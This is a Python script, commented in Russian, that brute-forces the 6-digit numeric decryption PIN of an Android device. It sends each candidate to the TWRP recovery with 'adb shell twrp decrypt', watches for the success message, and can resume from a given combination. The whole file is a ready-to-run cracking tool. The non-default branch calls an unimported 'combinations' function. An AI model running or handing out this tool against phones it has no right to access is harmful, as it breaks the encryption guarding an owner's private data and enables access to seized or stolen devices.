#!/usr/bin/env python3
import os
import time
import argparse
from itertools import product

# Конфигурация
SYMBOLS = '0123456789'        # Используемые символы
ALLOW_REPEATS = True          # Разрешить повторяющиеся символы
PASSWORD_LENGTH = 6           # Длина комбинации

def validate_combination(comb: str) -> bool:
    """Проверяет корректность стартовой комбинации"""
    return len(comb) == PASSWORD_LENGTH and all(c in SYMBOLS for c in comb)

def generate_combinations(start: str = None) -> iter:
    """Генератор комбинаций с возможностью старта с определенной позиции"""
    if start is None:
        start = SYMBOLS[0] * PASSWORD_LENGTH
        
    start_seq = tuple(start)
    gen = product(SYMBOLS, repeat=PASSWORD_LENGTH) if ALLOW_REPEATS else \
          combinations(SYMBOLS, PASSWORD_LENGTH)
    
    started = False
    for comb in gen:
        if not started:
            if comb == start_seq:
                started = True
            else:
                continue
        yield ''.join(comb)

def main():
    parser = argparse.ArgumentParser(description='TWRP Decryption Bruteforce')
    parser.add_argument('-s', '--start', type=str, help='Стартовая комбинация')
    args = parser.parse_args()

    start_comb = args.start
    if start_comb and not validate_combination(start_comb):
        print(f"Ошибка: некорректная стартовая комбинация!")
        exit(1)

    total = 10**PASSWORD_LENGTH if ALLOW_REPEATS else \
            len(list(combinations(SYMBOLS, PASSWORD_LENGTH)))

    for n, password in enumerate(generate_combinations(start_comb), 1):
        print(f"Попытка {n}/{total}: {password}")
        
        result = os.popen(f"adb shell twrp decrypt {password}").read()
        
        if 'Data successfully decrypted' in result:
            print(f"\nУспех! Пароль: {password}")
            return
            
        if "Attempting to decrypt" not in result:
            print("\nОшибка выполнения команды. Проверьте подключение!")
            return
            
        time.sleep(0.3)

    print("\nПароль не найден")

if __name__ == "__main__":
    main()
